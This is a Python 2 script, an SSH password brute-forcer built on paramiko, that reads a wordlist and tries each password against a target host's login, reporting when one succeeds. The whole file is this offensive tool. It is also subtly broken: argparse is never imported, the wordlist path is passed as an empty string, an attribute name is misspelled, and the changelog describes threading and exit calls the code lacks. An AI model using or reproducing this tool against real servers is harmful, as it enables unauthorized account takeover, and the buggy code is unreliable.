
#   - Removed shebang from module
#   - Minimized length of args
#   - Verify that file object exists
#   - Verify that user has read access to file object
#   - Removed use of python builtin word: 'file' replaced with 'fobj'
#   - Defined connection timeout (2 sec) for non responsive SSH server.
#     Will return a tuple from try-except in ssh_connect() on timeout.
#     Calls sys.exit(1) if timeout to SSH server occurs.
#   - try-except in start() will check type before if-elif statements
#   - Calls sys.exit(0) when correct password is found.
#   - Removed try-except in start(). Not sure what exceptions this will be
#     catching, except a possible KeyboardInterrupt?
#   - Use 'threading' to improve brute force attack speed
#


import os
import paramiko
import sys
import socket
from os import R_OK


class SSHbruteForce(object):
    
    def __init__(self, target, user, fobj):
        self.target = target
        self.user = user
        self.fobj = fobj


    def exists(self):
        """Tests if the file exists and if the executing user has read access
        to the file. Returns file if both tests are passed. """
        if not os.path.isfile(self.fobj):
            print '[-] File not found: {0}'.format(self.fobj)
            sys.exit(1)

        if not os.access(self.fobj, R_OK):
            print '[-] Denied read access: {0}'.format(self.fobj)
            sys.exit(1)

        if os.path.isfile(self.fobj) and os.access(self.fobj, R_OK):
            return self.fobj


    def ssh_connect(self, passwd, code=0):
        """Connects to the SSH server, attempts to authenticate and returns the
        exit code from the attempt. """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, port=22, username=self.user, password=passwd, timeout=2)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error, err:
            code = 2, err

        ssh.close()
        return code


    def start(self):
        """Itterates trough the password list and checks wheter or not the
        correct password has been found. """
        fobj = self.exists()
        wlist = open(fobj)

        for i in wlist.readlines():
            passwd = i.strip("\n")
            resp = self.ssh_connect(passwd)

            if type(resp) == int:

                if resp == 0:
                    print "[+] User: {0}".format(self.user)
                    print "[+] Password found!: {0}".format(passwd)
                    break

                if resp == 1:
                    print "[-] User: {0} Password: {1}".format(self.usr, passwd)

            elif resp[0] == 2:
                print "[!] {0}: {1}".format(resp[1], self.target)
                break

        wlist.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Brute-forcer')
    parser.add_argument('--target', action="store", dest="target",required=True)
    parser.add_argument('--user', action="store", dest="user",required=True)
    given_args = parser.parse_args()
    target= given_args.target
    user= given_args.user
    ssh  = SSHbruteForce(target,user,'');
    ssh.start();	